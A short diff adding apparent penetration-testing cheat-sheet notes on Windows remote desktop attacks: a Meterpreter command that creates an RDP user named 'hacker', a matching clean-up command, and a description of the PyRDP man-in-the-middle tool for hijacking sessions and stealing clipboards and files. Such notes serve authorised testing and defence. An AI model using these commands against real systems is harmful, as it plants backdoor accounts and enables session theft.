@@ -1,0 +1,9 @@
+meterpreter> run getgui -u hacker -p s3cr3t
+
+# Clean up command:
+meterpreter> run multi_console_command \
+                 -rc /root/.msf3/logs/scripts/getgui/clean_up__20110112.2448.rc
+
+PyRDP
+	https://github.com/GoSecure/pyrdp
+	MITM - take control of sessions, actively steal client-side clipboards, browse client-side filesystem (manual & automated), extract videos of recorded sessions
